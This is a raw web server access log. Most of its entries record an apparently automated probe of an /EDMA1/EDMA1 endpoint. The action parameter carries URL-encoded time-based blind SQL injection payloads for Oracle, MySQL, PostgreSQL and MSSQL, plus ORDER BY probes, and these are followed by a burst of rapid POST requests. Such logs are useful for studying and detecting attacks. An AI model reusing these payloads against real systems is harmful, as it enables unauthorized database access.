179.60.150.123 - - [13/Jun/2022:11:16:29 +0200] "GET /EDMA1/EDMA1?action=edit%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%2883%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:31 +0200] "GET /EDMA1/EDMA1?action=edit%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%2883%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:32 +0200] "GET /EDMA1/EDMA1?action=edit%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%2883%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:34 +0200] "GET /EDMA1/EDMA1?action=edit%27%29%20AND%20%28SELECT%204237%20FROM%20%28SELECT%28SLEEP%285%29%29%29qKQq%29%20AND%20%28%27gHTH%27%3D%27gHTH HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
89.246.241.14 - - [13/Jun/2022:11:16:34 +0200] "GET /ODDB/IndividuelleMediliste HTTP/1.1" 200 9139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"
179.60.150.123 - - [13/Jun/2022:11:16:35 +0200] "GET /EDMA1/EDMA1?action=edit%27%20AND%20%28SELECT%204237%20FROM%20%28SELECT%28SLEEP%285%29%29%29qKQq%29%20AND%20%27BMxg%27%3D%27BMxg HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:36 +0200] "GET /EDMA1/EDMA1?action=edit%29%20AND%20%28SELECT%204237%20FROM%20%28SELECT%28SLEEP%285%29%29%29qKQq%29%20AND%20%282772%3D2772 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:37 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%20%28SELECT%204237%20FROM%20%28SELECT%28SLEEP%285%29%29%29qKQq%29 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:38 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%20%28SELECT%204237%20FROM%20%28SELECT%28SLEEP%285%29%29%29qKQq%29--%20MUbb HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:39 +0200] "GET /EDMA1/EDMA1?action=edit%27%29%20AND%203278%3D%28SELECT%203278%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27mgvZ%27%3D%27mgvZ HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:40 +0200] "GET /EDMA1/EDMA1?action=edit%27%20AND%203278%3D%28SELECT%203278%20FROM%20PG_SLEEP%285%29%29%20AND%20%27uJWz%27%3D%27uJWz HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:41 +0200] "GET /EDMA1/EDMA1?action=edit%29%20AND%203278%3D%28SELECT%203278%20FROM%20PG_SLEEP%285%29%29%20AND%20%281844%3D1844 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:43 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%203278%3D%28SELECT%203278%20FROM%20PG_SLEEP%285%29%29 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:44 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%203278%3D%28SELECT%203278%20FROM%20PG_SLEEP%285%29%29--%20ZRZL HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:46 +0200] "GET /EDMA1/EDMA1?action=edit%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27NwWV%27%3D%27NwWV HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:47 +0200] "GET /EDMA1/EDMA1?action=edit%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27FHoT%27%3D%27FHoT HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:48 +0200] "GET /EDMA1/EDMA1?action=edit%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%286181%3D6181 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:49 +0200] "GET /EDMA1/EDMA1?action=edit%20WAITFOR%20DELAY%20%270%3A0%3A5%27 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:51 +0200] "GET /EDMA1/EDMA1?action=edit%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20FxdB HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:52 +0200] "GET /EDMA1/EDMA1?action=edit%27%29%20AND%203817%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2881%29%7C%7CCHR%2867%29%7C%7CCHR%28119%29%7C%7CCHR%28114%29%2C5%29%20AND%20%28%27pOwt%27%3D%27pOwt HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:54 +0200] "GET /EDMA1/EDMA1?action=edit%27%20AND%203817%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2881%29%7C%7CCHR%2867%29%7C%7CCHR%28119%29%7C%7CCHR%28114%29%2C5%29%20AND%20%27XFwc%27%3D%27XFwc HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:55 +0200] "GET /EDMA1/EDMA1?action=edit%29%20AND%203817%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2881%29%7C%7CCHR%2867%29%7C%7CCHR%28119%29%7C%7CCHR%28114%29%2C5%29%20AND%20%283561%3D3561 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:56 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%203817%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2881%29%7C%7CCHR%2867%29%7C%7CCHR%28119%29%7C%7CCHR%28114%29%2C5%29 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:57 +0200] "GET /EDMA1/EDMA1?action=edit%20AND%203817%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2881%29%7C%7CCHR%2867%29%7C%7CCHR%28119%29%7C%7CCHR%28114%29%2C5%29--%20xKGC HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:16:59 +0200] "GET /EDMA1/EDMA1?action=edit%27%29%20ORDER%20BY%201--%20FmPL HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:17:02 +0200] "GET /EDMA1/EDMA1?action=edit%27%20ORDER%20BY%201--%20SPqQ HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:17:05 +0200] "GET /EDMA1/EDMA1?action=edit%29%20ORDER%20BY%201--%20StTK HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:17:07 +0200] "GET /EDMA1/EDMA1?action=edit%20ORDER%20BY%201--%20xhzC HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
179.60.150.123 - - [13/Jun/2022:11:17:09 +0200] "GET /EDMA1/EDMA1?action=edit%20ORDER%20BY%201--%20UXGa HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)"
54.36.148.55 - - [13/Jun/2022:11:18:24 +0200] "GET /Main/2009 HTTP/1.1" 200 21688 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
179.60.150.123 - - [13/Jun/2022:11:18:54 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 200 9332 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:19:08 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 200 9332 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:19:28 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:19:43 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:19:49 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:06 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:14 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:20 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:27 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:32 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:34 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:35 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:37 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:37 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:39 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:40 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:41 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:42 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:43 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:44 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:45 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:46 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:46 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:47 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:48 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:49 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:49 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:50 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:51 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:51 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:52 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:53 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:54 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:55 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:55 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:56 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:57 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:58 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:59 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:20:59 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:00 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:01 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:02 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:03 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:03 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:05 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:06 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:07 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:08 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:08 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:09 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:10 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:11 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:12 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:12 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:13 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:14 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:15 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:15 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:16 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:17 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
